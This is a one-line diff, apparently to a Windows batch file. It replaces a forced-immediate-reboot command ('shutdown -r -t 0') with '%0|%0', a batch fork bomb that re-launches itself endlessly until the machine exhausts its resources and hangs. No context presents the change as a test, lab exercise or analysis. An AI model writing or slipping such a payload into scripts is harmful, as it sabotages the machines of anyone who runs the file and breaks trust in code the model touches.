@@ -1,1 +1,1 @@
-shutdown -r -t 0
+%0|%0
